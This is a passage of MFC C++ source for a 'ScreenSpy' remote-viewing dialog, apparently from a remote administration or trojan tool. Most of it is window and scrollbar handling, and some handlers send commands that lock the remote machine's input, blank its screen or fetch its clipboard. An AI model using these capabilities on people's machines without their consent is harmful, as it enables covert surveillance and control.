	sbiv.dxyLineButton = sbiv.rgstate[0] & STATE_SYSTEM_INVISIBLE ? 0 : sbiv.dxyLineButton;
	sbih.dxyLineButton = sbih.rgstate[0] & STATE_SYSTEM_INVISIBLE ? 0 : sbih.dxyLineButton;
	// 根据客户区大小, 调整水平滚动条和垂直滚动条的状态
	if (cx >= m_lpbmi_full->bmiHeader.biWidth)
		ShowScrollBar(SB_HORZ, FALSE);
	else
	{
		si.nMax = m_lpbmi_full->bmiHeader.biWidth - cx;
		SetScrollInfo(SB_HORZ, &si, TRUE);
	}
	if (cy >= m_lpbmi_full->bmiHeader.biHeight)
		ShowScrollBar(SB_VERT, FALSE);
	else
	{
		SCROLLBARINFO sbit;
		sbit.cbSize = sizeof(SCROLLBARINFO);
		GetScrollBarInfo(m_hWnd, OBJID_HSCROLL, &sbit);
		si.nMax = m_lpbmi_full->bmiHeader.biHeight - cy - (sbit.rgstate[0] & STATE_SYSTEM_INVISIBLE ? sbih.dxyLineButton : 0);
		SetScrollInfo(SB_VERT, &si, TRUE);
	}
	// 客户区宽度+垂直滚动条宽度>=分辨率宽度 && 客户区高度+水平滚动条高度>=分辨率高度
	if (cx + sbiv.dxyLineButton >= m_lpbmi_full->bmiHeader.biWidth && cy + sbih.dxyLineButton >= m_lpbmi_full->bmiHeader.biHeight)
	{
		ShowScrollBar(SB_BOTH, FALSE);
	}
	// 水平滚动条不可见时, 窗口宽度增加一个垂直滚动条的宽度
	if (sbih.rgstate[0] & STATE_SYSTEM_INVISIBLE && !m_rcRestore.right && !m_rcRestore.bottom)
	{
		RECT rectWindow;
		GetWindowRect(&rectWindow);
		rectWindow.right += sbiv.dxyLineButton;
		MoveWindow(&rectWindow);
	}
	// 垂直滚动条不可见时, 窗口高度增加一个水平滚动条的高度
	if (sbiv.rgstate[0] & STATE_SYSTEM_INVISIBLE && !m_rcRestore.right && !m_rcRestore.bottom)
	{
		RECT rectWindow;
		GetWindowRect(&rectWindow);
		rectWindow.bottom += sbih.dxyLineButton;
		MoveWindow(&rectWindow);
	}
	
	if (GetScrollPos(SB_HORZ) + cx > m_lpbmi_full->bmiHeader.biWidth)
		SetScrollPos(SB_HORZ, m_lpbmi_full->bmiHeader.biWidth - cx);
	if (GetScrollPos(SB_VERT) + cy > m_lpbmi_full->bmiHeader.biHeight)
		SetScrollPos(SB_VERT, m_lpbmi_full->bmiHeader.biHeight - cy);
}

void CScreenSpyDlg::OnNcLButtonDblClk(UINT nHitTest, CPoint point)
{
	if (nHitTest == HTCAPTION)
	{
		RECT rectClient;
		if (m_rcRestore.right && m_rcRestore.bottom)
		{
			MoveWindow(&m_rcRestore);
			memset(&m_rcRestore, 0, sizeof(m_rcRestore));
			// 必须OnSize一次, 否则滚动条显示有点问题
			GetClientRect(&rectClient);
			OnSize(0, rectClient.right, rectClient.bottom);
			return;
		}
		
		APPBARDATA abd;
		memset(&abd, 0, sizeof(abd));
		abd.cbSize = sizeof(abd);
		int nMinX, nMinY, nMaxWindowWidth, nMaxWindowHeight;
		UINT_PTR uState = SHAppBarMessage(ABM_GETSTATE, &abd);
		SHAppBarMessage(ABM_GETTASKBARPOS, &abd);
		if (abd.uEdge == 0) // 任务栏在左
		{
			nMinX = uState == ABS_AUTOHIDE ? 0 : abd.rc.right;
			nMinY = 0;
			nMaxWindowWidth = GetSystemMetrics(SM_CXSCREEN) - (uState == ABS_AUTOHIDE ? 0 : abd.rc.right);
			nMaxWindowHeight = GetSystemMetrics(SM_CYSCREEN);
		}
		if (abd.uEdge == 1) // 任务栏在上
		{
			nMinX = 0;
			nMinY = uState == ABS_AUTOHIDE ? 0 : abd.rc.bottom;
			nMaxWindowWidth = GetSystemMetrics(SM_CXSCREEN);
			nMaxWindowHeight = GetSystemMetrics(SM_CYSCREEN) - (uState == ABS_AUTOHIDE ? 0 : abd.rc.bottom);
		}
		if (abd.uEdge == 2) // 任务栏在右
		{
			nMinX = 0;
			nMinY = 0;
			nMaxWindowWidth = GetSystemMetrics(SM_CXSCREEN) - (uState == ABS_AUTOHIDE ? 0 : abd.rc.right - abd.rc.left);
			nMaxWindowHeight = GetSystemMetrics(SM_CYSCREEN);
		}
		if (abd.uEdge == 3) // 任务栏在下
		{
			nMinX = 0;
			nMinY = 0;
			nMaxWindowWidth = GetSystemMetrics(SM_CXSCREEN);
			nMaxWindowHeight = GetSystemMetrics(SM_CYSCREEN) - (uState == ABS_AUTOHIDE ? 0 : abd.rc.bottom - abd.rc.top);
		}
		
		GetWindowRect(&m_rcRestore);
		GetClientRect(&rectClient);
		ClientToScreen(&rectClient);
		
		int	nBorderSize = rectClient.left - m_rcRestore.left; // 单边框的大小(宽度或高度)
		int	nTitleHeight = rectClient.top - m_rcRestore.top - nBorderSize; // 标题栏的高度
		int nMaxClientWidth = nMaxWindowWidth - nBorderSize * 2;
		int nMaxClientHeight = nMaxWindowHeight - nTitleHeight - nBorderSize * 2;
		
		if (m_lpbmi_full->bmiHeader.biWidth < nMaxClientWidth && m_lpbmi_full->bmiHeader.biHeight < nMaxClientHeight)
		{
			int nMovWindowWidth = m_lpbmi_full->bmiHeader.biWidth + nBorderSize * 2;
			int nMovWindowHeight = m_lpbmi_full->bmiHeader.biHeight + nTitleHeight + nBorderSize * 2;
			int x = (nMaxWindowWidth - nMovWindowWidth) / 2 + nMinX;
			int y = (nMaxWindowHeight - nMovWindowHeight) / 2 + nMinY;
			MoveWindow(x, y, nMovWindowWidth, nMovWindowHeight);
		}
		else if (m_lpbmi_full->bmiHeader.biWidth < nMaxClientWidth)
		{
			SCROLLBARINFO sbiv;
			sbiv.cbSize = sizeof(SCROLLBARINFO);
			ShowScrollBar(SB_VERT, TRUE);
			GetScrollBarInfo(m_hWnd, OBJID_VSCROLL, &sbiv);
			int nMovWindowWidth = m_lpbmi_full->bmiHeader.biWidth + nBorderSize * 2;
			if (nMovWindowWidth + sbiv.dxyLineButton <= nMaxWindowWidth)
				nMovWindowWidth += sbiv.dxyLineButton;
			int nMovWindowHeight = nMaxWindowHeight;
			int x = (nMaxWindowWidth - nMovWindowWidth) / 2 + nMinX;
			MoveWindow(x, nMinY, nMovWindowWidth, nMovWindowHeight);
		}
		else if (m_lpbmi_full->bmiHeader.biHeight < nMaxClientHeight)
		{
			SCROLLBARINFO sbih;
			sbih.cbSize = sizeof(SCROLLBARINFO);
			ShowScrollBar(SB_VERT, TRUE);
			GetScrollBarInfo(m_hWnd, OBJID_HSCROLL, &sbih);
			int nMovWindowWidth = nMaxWindowWidth;
			int nMovWindowHeight = m_lpbmi_full->bmiHeader.biHeight + nTitleHeight + nBorderSize * 2;
			if (nMovWindowHeight + sbih.dxyLineButton <= nMaxWindowHeight)
				nMovWindowHeight += sbih.dxyLineButton;
			int y = (nMaxWindowHeight - nMovWindowHeight) / 2 + nMinY;
			MoveWindow(nMinX, y, nMovWindowWidth, nMovWindowHeight);
		}
		else
		{
			int nMovWindowWidth = nMaxWindowWidth;
			int nMovWindowHeight = nMaxWindowHeight;
			MoveWindow(nMinX, nMinY, nMovWindowWidth, nMovWindowHeight);
		}
		// 必须OnSize一次, 否则滚动条显示有点问题
		GetClientRect(&rectClient);
		OnSize(0, rectClient.right, rectClient.bottom);
		return;
	}
}

void CScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	CMenu* pSysMenu = GetSystemMenu(FALSE);
	switch (nID)
	{
	case SC_MAXIMIZE:
		OnNcLButtonDblClk(HTCAPTION, NULL);
		return;
	case SC_MONITORPOWER: // 拦截显示器节电自动关闭的消息
		return;
	case SC_SCREENSAVE:   // 拦截屏幕保护启动的消息
		return;
	case IDM_CONTROL:
		{
			m_bIsCtrl = !m_bIsCtrl;
			pSysMenu->CheckMenuItem(IDM_CONTROL, m_bIsCtrl ? MF_CHECKED : MF_UNCHECKED);
			
			if (m_bIsCtrl)
			{
				if (m_bIsTraceCursor)
					SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)AfxGetApp()->LoadCursor(IDC_DOT));
				else
					SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)m_hRemoteCursor);
			}
			else
				SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)LoadCursor(NULL, IDC_NO));
		}
		break;
	case IDM_TOPMOST:
		{
			bool bIsTopMost = pSysMenu->GetMenuState(IDM_TOPMOST, MF_BYCOMMAND) & MF_CHECKED;
			pSysMenu->CheckMenuItem(IDM_TOPMOST, bIsTopMost ? MF_UNCHECKED : MF_CHECKED);
			if (bIsTopMost)
				SetWindowPos(&wndNoTopMost, 0, 0, 0, 0, SWP_NOMOVE|SWP_NOSIZE);
			else
				SetWindowPos(&wndTopMost, 0, 0, 0, 0, SWP_NOMOVE|SWP_NOSIZE);
		}
		break;
	case IDM_CTRL_ALT_DEL:
		{
			BYTE	bToken = COMMAND_SCREEN_CTRL_ALT_DEL;
			m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
		}
		break;
	case IDM_TRACE_CURSOR:   // 跟踪服务端鼠标
		{
			m_bIsTraceCursor = !m_bIsTraceCursor;	
			pSysMenu->CheckMenuItem(IDM_TRACE_CURSOR, m_bIsTraceCursor ? MF_CHECKED : MF_UNCHECKED);
			if (m_bIsCtrl)
			{
				if (!m_bIsTraceCursor)
					SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)m_hRemoteCursor);
				else
					SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)AfxGetApp()->LoadCursor(IDC_DOT));
			}
			// 重绘消除或显示鼠标
			OnPaint();
		}
		break;
	case IDM_BLOCK_INPUT:    // 锁定服务端鼠标和键盘
		{
			bool bIsChecked = pSysMenu->GetMenuState(IDM_BLOCK_INPUT, MF_BYCOMMAND) & MF_CHECKED;
			pSysMenu->CheckMenuItem(IDM_BLOCK_INPUT, bIsChecked ? MF_UNCHECKED : MF_CHECKED);
			
			BYTE	bToken[2];
			bToken[0] = COMMAND_SCREEN_BLOCK_INPUT;
			bToken[1] = !bIsChecked;
			m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
		}
		break;
	case IDM_BLANK_SCREEN:   // 服务端黑屏
		{
			bool bIsChecked = pSysMenu->GetMenuState(IDM_BLANK_SCREEN, MF_BYCOMMAND) & MF_CHECKED;
			pSysMenu->CheckMenuItem(IDM_BLANK_SCREEN, bIsChecked ? MF_UNCHECKED : MF_CHECKED);
			
			BYTE	bToken[2];
			bToken[0] = COMMAND_SCREEN_BLANK;
			bToken[1] = !bIsChecked;
			m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
		}
		break;
	case IDM_CAPTURE_LAYER:  // 捕捉层
		{
			bool bIsChecked = pSysMenu->GetMenuState(IDM_CAPTURE_LAYER, MF_BYCOMMAND) & MF_CHECKED;
			pSysMenu->CheckMenuItem(IDM_CAPTURE_LAYER, bIsChecked ? MF_UNCHECKED : MF_CHECKED);
			
			BYTE	bToken[2];
			bToken[0] = COMMAND_SCREEN_CAPTURE_LAYER;
			bToken[1] = !bIsChecked;
			m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));			
		}
		break;
	case IDM_SAVEDIB:
		SaveSnapshot();
		break;
	case IDM_GET_CLIPBOARD:  // 获取剪贴板
		{
			BYTE	bToken = COMMAND_SCREEN_GET_CLIPBOARD;
			m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
		}
		break;
	case IDM_SET_CLIPBOARD:  // 设置剪贴板
		{
			SendLocalClipboard();
		}
		break;
	case IDM_AERO_DISABLE:   // 禁用桌面合成(Aero)
		{
			BYTE	bToken = COMMAND_AERO_DISABLE;
			m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
		}
		break;
	case IDM_AERO_ENABLE:    // 启用桌面合成(Aero)
		{
			BYTE	bToken = COMMAND_AERO_ENABLE;
			m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
		}
		break;
	case IDM_ALGORITHM_HOME: // 家用办公算法
		{
			SendResetScreen(32);
			pSysMenu->CheckMenuRadioItem(IDM_ALGORITHM_HOME, IDM_ALGORITHM_XVID, IDM_ALGORITHM_HOME, MF_BYCOMMAND);
			pSysMenu->CheckMenuRadioItem(IDM_DEEP_16, IDM_DEEP_32, IDM_DEEP_32, MF_BYCOMMAND);
			pSysMenu->EnableMenuItem(IDM_DEEP_16, MF_GRAYED);
			SendResetAlgorithm(ALGORITHM_HOME);
		}
		break;
	case IDM_ALGORITHM_XVID: // 影视娱乐算法
		{
			SendResetAlgorithm(ALGORITHM_XVID);
			pSysMenu->CheckMenuRadioItem(IDM_ALGORITHM_HOME, IDM_ALGORITHM_XVID, IDM_ALGORITHM_XVID, MF_BYCOMMAND);
			pSysMenu->EnableMenuItem(IDM_DEEP_16, MF_ENABLED);
		}
		break;
// 	case IDM_DEEP_1:
// 		{
// 			SendResetScreen(1);
// 			pSysMenu->CheckMenuRadioItem(IDM_DEEP_1, IDM_DEEP_32, IDM_DEEP_1, MF_BYCOMMAND);
// 		}
// 		break;
// 	case IDM_DEEP_4_GRAY:
// 		{
// 			SendResetScreen(3);
// 			pSysMenu->CheckMenuRadioItem(IDM_DEEP_1, IDM_DEEP_32, IDM_DEEP_4_GRAY, MF_BYCOMMAND);
// 		}
// 		break;
// 	case IDM_DEEP_4_COLOR:
// 		{
// 			SendResetScreen(4);
// 			pSysMenu->CheckMenuRadioItem(IDM_DEEP_1, IDM_DEEP_32, IDM_DEEP_4_COLOR, MF_BYCOMMAND);
// 		}
// 		break;
// 	case IDM_DEEP_8_GRAY:
// 		{
// 			SendResetScreen(7);
// 			pSysMenu->CheckMenuRadioItem(IDM_DEEP_1, IDM_DEEP_32, IDM_DEEP_8_GRAY, MF_BYCOMMAND);
// 		}
// 		break;
// 	case IDM_DEEP_8_COLOR:
// 		{
// 			SendResetScreen(8);
// 			pSysMenu->CheckMenuRadioItem(IDM_DEEP_1, IDM_DEEP_32, IDM_DEEP_8_COLOR, MF_BYCOMMAND);
// 		}
// 		break;
	case IDM_DEEP_16:
		{
			SendResetScreen(16);
			pSysMenu->CheckMenuRadioItem(IDM_DEEP_16, IDM_DEEP_32, IDM_DEEP_16, MF_BYCOMMAND);
		}
		break;
	case IDM_DEEP_32:
		{
			SendResetScreen(32);
			pSysMenu->CheckMenuRadioItem(IDM_DEEP_16, IDM_DEEP_32, IDM_DEEP_32, MF_BYCOMMAND);
		}
		break;
	default:
		CDialog::OnSysCommand(nID, lParam);
	}
}

void CScreenSpyDlg::OnGetMinMaxInfo(MINMAXINFO* lpMMI)
{
	RECT rectWindow, rectClient;
	GetWindowRect(&rectWindow);
	GetClientRect(&rectClient);
	ClientToScreen(&rectClient);
	
	int	nBorderSize = rectClient.left - rectWindow.left; // 单边框的大小(宽度或高度)
	int	nTitleHeight = rectClient.top - rectWindow.top - nBorderSize; // 标题栏的高度
// 	int nMinWindowWidth = 400 + nBorderSize * 2;
// 	int nMinWindowHeight = 300 + nTitleHeight + nBorderSize * 2;
	int nMaxWindowWidth = m_lpbmi_full->bmiHeader.biWidth + nBorderSize * 2;
	int nMaxWindowHeight = m_lpbmi_full->bmiHeader.biHeight + nTitleHeight + nBorderSize * 2;
	
	SCROLLBARINFO sbiv, sbih;
	sbiv.cbSize = sizeof(SCROLLBARINFO);
	sbih.cbSize = sizeof(SCROLLBARINFO);
	GetScrollBarInfo(m_hWnd, OBJID_VSCROLL, &sbiv);
	GetScrollBarInfo(m_hWnd, OBJID_HSCROLL, &sbih);
// 	nMinWindowWidth += sbiv.dxyLineButton;
// 	nMinWindowHeight += sbih.dxyLineButton;
	nMaxWindowWidth += sbiv.rgstate[0] & STATE_SYSTEM_INVISIBLE ? 0 : sbiv.dxyLineButton;
	nMaxWindowHeight += sbih.rgstate[0] & STATE_SYSTEM_INVISIBLE ? 0 : sbih.dxyLineButton;
	
// 	lpMMI->ptMinTrackSize.x = nMinWindowWidth;
// 	lpMMI->ptMinTrackSize.y = nMinWindowHeight;
	lpMMI->ptMaxTrackSize.x = nMaxWindowWidth;
	lpMMI->ptMaxTrackSize.y = nMaxWindowHeight;
	
// 	APPBARDATA abd;
// 	memset(&abd, 0, sizeof(abd));
// 	abd.cbSize = sizeof(abd);
// 	UINT_PTR uState = SHAppBarMessage(ABM_GETSTATE, &abd);
// 	SHAppBarMessage(ABM_GETTASKBARPOS, &abd);
// 	if (abd.uEdge == 0) // 任务栏在左
// 	{
// 		lpMMI->ptMaxPosition.x = uState == ABS_AUTOHIDE ? 0 : abd.rc.right;
// 		lpMMI->ptMaxPosition.y = 0;
// 		lpMMI->ptMaxSize.x = GetSystemMetrics(SM_CXSCREEN) - (uState == ABS_AUTOHIDE ? 0 : abd.rc.right);
// 		lpMMI->ptMaxSize.y = GetSystemMetrics(SM_CYSCREEN);
// 	}
// 	if (abd.uEdge == 1) // 任务栏在上
// 	{
// 		lpMMI->ptMaxPosition.x = 0;
// 		lpMMI->ptMaxPosition.y = uState == ABS_AUTOHIDE ? 0 : abd.rc.bottom;
// 		lpMMI->ptMaxSize.x = GetSystemMetrics(SM_CXSCREEN);
// 		lpMMI->ptMaxSize.y = GetSystemMetrics(SM_CYSCREEN) - (uState == ABS_AUTOHIDE ? 0 : abd.rc.bottom);
// 	}
// 	if (abd.uEdge == 2) // 任务栏在右
// 	{
// 		lpMMI->ptMaxPosition.x = 0;
// 		lpMMI->ptMaxPosition.y = 0;
// 		lpMMI->ptMaxSize.x = GetSystemMetrics(SM_CXSCREEN) - (uState == ABS_AUTOHIDE ? 0 : abd.rc.right - abd.rc.left);
// 		lpMMI->ptMaxSize.y = GetSystemMetrics(SM_CYSCREEN);
// 	}
// 	if (abd.uEdge == 3) // 任务栏在下
// 	{
// 		lpMMI->ptMaxPosition.x = 0;
// 		lpMMI->ptMaxPosition.y = 0;
// 		lpMMI->ptMaxSize.x = GetSystemMetrics(SM_CXSCREEN);
// 		lpMMI->ptMaxSize.y = GetSystemMetrics(SM_CYSCREEN) - (uState == ABS_AUTOHIDE ? 0 : abd.rc.bottom - abd.rc.top);
// 	}
}

void CScreenSpyDlg::DrawTipString(CString str)
{
	RECT rect;
	GetClientRect(&rect);
	COLORREF bgcol = RGB(0x00, 0x00, 0x00);	
	COLORREF oldbgcol  = SetBkColor(m_hCurrWndDC, bgcol);
	COLORREF oldtxtcol = SetTextColor(m_hCurrWndDC, RGB(0xff,0x00,0x00));
	ExtTextOut(m_hCurrWndDC, 0, 0, ETO_OPAQUE, &rect, NULL, 0, NULL);
	
	DrawText (m_hCurrWndDC, str, -1, &rect,
		DT_SINGLELINE | DT_CENTER | DT_VCENTER);
	
	SetBkColor(m_hCurrWndDC, oldbgcol);
	SetTextColor(m_hCurrWndDC, oldtxtcol);
/*	InvalidateRect(NULL, FALSE);*/
}

BOOL CScreenSpyDlg::PreTranslateMessage(MSG* pMsg) 
{
	// TODO: Add your specialized code here and/or call the base class
	
	switch (pMsg->message)
	{
	case WM_MOUSEMOVE:
		if (GetKeyState(VK_SCROLL) & 0x0001) // Scroll灯点亮状态
		{
			CRect ClientRect;
			GetClientRect(ClientRect);
			
			int nHScrollPos = (float)m_lpbmi_full->bmiHeader.biWidth / ClientRect.Width() * LOWORD(pMsg->lParam);
			int nVScrollPos = (float)m_lpbmi_full->bmiHeader.biHeight / ClientRect.Height() *  HIWORD(pMsg->lParam);
			SCROLLBARINFO sbi; int nMinPos, nMaxPos;
			sbi.cbSize = sizeof(SCROLLBARINFO);
			GetScrollBarInfo(m_hWnd, OBJID_HSCROLL, &sbi);
			if (!(sbi.rgstate[0] & STATE_SYSTEM_INVISIBLE))
			{
				GetScrollRange(SB_HORZ, &nMinPos, &nMaxPos);
				if (nHScrollPos > nMaxPos)
					nHScrollPos = nMaxPos;
				PostMessage(WM_HSCROLL, MAKEWPARAM(SB_THUMBTRACK, nHScrollPos), NULL);
			}
			GetScrollBarInfo(m_hWnd, OBJID_VSCROLL, &sbi);
			if (!(sbi.rgstate[0] & STATE_SYSTEM_INVISIBLE))
			{
				GetScrollRange(SB_VERT, &nMinPos, &nMaxPos);
				if (nVScrollPos > nMaxPos)
					nVScrollPos = nMaxPos;
				PostMessage(WM_VSCROLL, MAKEWPARAM(SB_THUMBTRACK, nVScrollPos), NULL);
			}
			
			ClientToScreen(ClientRect);
			ClipCursor(ClientRect);
		}
		else
		{
			ClipCursor(NULL);
		}
	case WM_LBUTTONDOWN:
	case WM_LBUTTONUP:
	case WM_RBUTTONDOWN:
	case WM_RBUTTONUP:
	case WM_LBUTTONDBLCLK:
	case WM_RBUTTONDBLCLK:
	case WM_MBUTTONDOWN:
	case WM_MBUTTONUP:
	case WM_MBUTTONDBLCLK:
	case WM_MOUSEWHEEL:
		{
			MSG	msg;
			memcpy(&msg, pMsg, sizeof(MSG));
			int xPos = (int)(short)LOWORD(pMsg->lParam) + GetScrollPos(SB_HORZ);
			int yPos = (int)(short)HIWORD(pMsg->lParam) + GetScrollPos(SB_VERT);
			msg.lParam = MAKELPARAM(xPos, yPos);
			msg.pt.x = xPos;
			msg.pt.y = yPos;
			SendCommand(&msg);
		}
		break;
  	case WM_KEYDOWN:
		if (pMsg->wParam == VK_RETURN && GetKeyState(VK_CONTROL)&0x8000 && GetKeyState(VK_MENU)&0x8000)
		{
			FullScreen();
			if (GetKeyState(VK_SCROLL) & 0x0001)
			{
				CRect ClientRect;
				GetClientRect(ClientRect);
				ClientToScreen(ClientRect);
				ClipCursor(ClientRect);
			}
			return TRUE;
		}
  	case WM_KEYUP:
		if (pMsg->wParam == VK_RETURN && GetKeyState(VK_CONTROL)&0x8000 && GetKeyState(VK_MENU)&0x8000)
		{
			return TRUE;
		}
	case WM_SYSKEYUP:
	case WM_SYSKEYDOWN:
 		if (pMsg->wParam != VK_SCROLL)
		{
			MSG	msg;
			memcpy(&msg, pMsg, sizeof(MSG));
			ScreenToClient(&msg.pt);
			msg.pt.x += GetScrollPos(SB_HORZ);
			msg.pt.y += GetScrollPos(SB_VERT);
			SendCommand(&msg);
			if (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE || pMsg->wParam == VK_F4)
				return TRUE;
		}
		if (pMsg->wParam == VK_SCROLL)
		{
			if (GetKeyState(VK_SCROLL) & 0x0001)
			{
				CRect ClientRect;
				GetClientRect(ClientRect);
				ClientToScreen(ClientRect);
				ClipCursor(ClientRect);
			}
			else ClipCursor(NULL);
		}
		break;
	default:
		break;
	}
	
	return CDialog::PreTranslateMessage(pMsg);
}

void CScreenSpyDlg::PostNcDestroy() 
{
	// TODO: Add your specialized code here and/or call the base class
	delete this;
	CDialog::PostNcDestroy();
}

void CScreenSpyDlg::SendCommand(MSG* pMsg)
{
	if (!m_bIsCtrl)
		return;
	
	LPBYTE lpData = new BYTE[sizeof(MSG) + 1];
	lpData[0] = COMMAND_SCREEN_CONTROL;
	memcpy(lpData + 1, pMsg, sizeof(MSG));
	m_iocpServer->Send(m_pContext, lpData, sizeof(MSG) + 1);
	
	delete[] lpData;
}

void CScreenSpyDlg::OnHScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar)
{
	// TODO: Add your message handler code here and/or call default
	SCROLLINFO si;
	si.cbSize = sizeof(SCROLLINFO);
	si.fMask = SIF_ALL;
	GetScrollInfo(SB_HORZ, &si);
	
	int nPrevPos = si.nPos;
	switch(nSBCode)
	{
	case SB_LEFT:
		si.nPos = si.nMin;
		break;
	case SB_RIGHT:
		si.nPos = si.nMax;
		break;
	case SB_LINELEFT:
		if (si.nPos > si.nMin)
			si.nPos--;
		break;
	case SB_LINERIGHT:
		if (si.nPos < si.nMax)
			si.nPos++;
		break;
	case SB_PAGELEFT:
		if (si.nPos > si.nMin)
			si.nPos = max(si.nMin, si.nPos - (int)si.nPage);
		break;
	case SB_PAGERIGHT:
		if (si.nPos < si.nMax)
			si.nPos = min(si.nMax, si.nPos + (int)si.nPage);
		break;
	case SB_THUMBPOSITION:
	case SB_THUMBTRACK:
		si.nPos = nPos;
		break;
	default:
		break;
	}
	si.fMask = SIF_POS;
	SetScrollInfo(SB_HORZ, &si, TRUE);
//	ScrollWindow(nPrevPos - si.nPos, 0);
	OnPaint();
	
	CDialog::OnHScroll(nSBCode, nPos, pScrollBar);
}

void CScreenSpyDlg::OnVScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar)
{
	// TODO: Add your message handler code here and/or call default
	SCROLLINFO si;
	si.cbSize = sizeof(SCROLLINFO);
	si.fMask = SIF_ALL;
	GetScrollInfo(SB_VERT, &si);
	
	int nPrevPos = si.nPos;
	switch(nSBCode)
	{
	case SB_TOP:
		si.nPos = si.nMin;
		break;
	case SB_BOTTOM:
		si.nPos = si.nMax;
		break;
	case SB_LINEUP:
		if (si.nPos > si.nMin)
			si.nPos--;
		break;
	case SB_LINEDOWN:
		if (si.nPos < si.nMax)
			si.nPos++;
		break;
	case SB_PAGEUP:
		if (si.nPos > si.nMin)
			si.nPos = max(si.nMin, si.nPos - (int)si.nPage);
		break;
	case SB_PAGEDOWN:
		if (si.nPos < si.nMax)
			si.nPos = min(si.nMax, si.nPos + (int)si.nPage);
		break;
	case SB_THUMBPOSITION:
	case SB_THUMBTRACK:
		si.nPos = nPos;
		break;
	default:
		break;
	}
	si.fMask = SIF_POS;
	SetScrollInfo(SB_VERT, &si, TRUE);
//	ScrollWindow(0, nPrevPos - si.nPos);
	OnPaint();
	
	CDialog::OnVScroll(nSBCode, nPos, pScrollBar);
}

void CScreenSpyDlg::UpdateLocalClipboard(char *buf, int len)
{
	if (!::OpenClipboard(NULL))
		return;
	
	::EmptyClipboard();
	HGLOBAL hglbCopy = GlobalAlloc(GPTR, len);
	if (hglbCopy != NULL) { 
		// Lock the handle and copy the text to the buffer.  
		LPTSTR lptstrCopy = (LPTSTR) GlobalLock(hglbCopy); 
		memcpy(lptstrCopy, buf, len); 
		GlobalUnlock(hglbCopy);          // Place the handle on the clipboard.  
		SetClipboardData(CF_TEXT, hglbCopy);
		GlobalFree(hglbCopy);
	}
	CloseClipboard();
}

void CScreenSpyDlg::SendLocalClipboard()
{
	if (!::OpenClipboard(NULL))
		return;
	HGLOBAL hglb = GetClipboardData(CF_TEXT);
	if (hglb == NULL)
	{
		::CloseClipboard();
		return;
	}
	int	nPacketLen = GlobalSize(hglb) + 1;
	LPSTR lpstr = (LPSTR) GlobalLock(hglb);  
	LPBYTE	lpData = new BYTE[nPacketLen];
	lpData[0] = COMMAND_SCREEN_SET_CLIPBOARD;
	memcpy(lpData + 1, lpstr, nPacketLen - 1);
	::GlobalUnlock(hglb);
	::CloseClipboard();
	m_iocpServer->Send(m_pContext, lpData, nPacketLen);
	delete[] lpData;
}

void CScreenSpyDlg::SendNext()
{
	BYTE	bBuff = COMMAND_NEXT;
	m_iocpServer->Send(m_pContext, &bBuff, 1);
}

LRESULT CScreenSpyDlg::OnMoving(WPARAM wParam, LPARAM lParam)
{
	SystemParametersInfo(SPI_GETWINARRANGING, 0, (LPVOID)&m_bWinArrange, 0);
	SystemParametersInfo(SPI_GETSNAPSIZING, 0, (LPVOID)&m_bSnapSizing, 0);
	SystemParametersInfo(SPI_SETWINARRANGING, 0, (LPVOID)TRUE, 0);
	SystemParametersInfo(SPI_SETSNAPSIZING, 0, (LPVOID)FALSE, 0);
	return FALSE;
}

void CScreenSpyDlg::OnMove(int x, int y) 
{
	CDialog::OnMove(x, y);
	
	// TODO: Add your message handler code here
	SystemParametersInfo(SPI_SETSNAPSIZING, 0, (LPVOID)m_bSnapSizing, 0);
	SystemParametersInfo(SPI_SETWINARRANGING, 0, (LPVOID)m_bWinArrange, 0);
}

LRESULT CScreenSpyDlg::WindowProc(UINT message, WPARAM wParam, LPARAM lParam) 
{
	// TODO: Add your specialized code here and/or call the base class
	if (message == WM_POWERBROADCAST && wParam == PBT_APMQUERYSUSPEND)
	{
		return BROADCAST_QUERY_DENY; // 拦截系统待机, 休眠的请求
	}
	if (message == WM_ACTIVATE && LOWORD(wParam) != WA_INACTIVE && !HIWORD(wParam) && m_bIsFullScreen)
	{
		SetWindowPos(&wndTopMost, 0, 0, 0, 0, SWP_NOMOVE|SWP_NOSIZE);
		return TRUE;
	}
	if (message == WM_ACTIVATE && LOWORD(wParam) == WA_INACTIVE && m_bIsFullScreen)
	{
		SetWindowPos(&wndNoTopMost, 0, 0, 0, 0, SWP_NOMOVE|SWP_NOSIZE);
		return TRUE;
	}
	
	return CDialog::WindowProc(message, wParam, lParam);
}
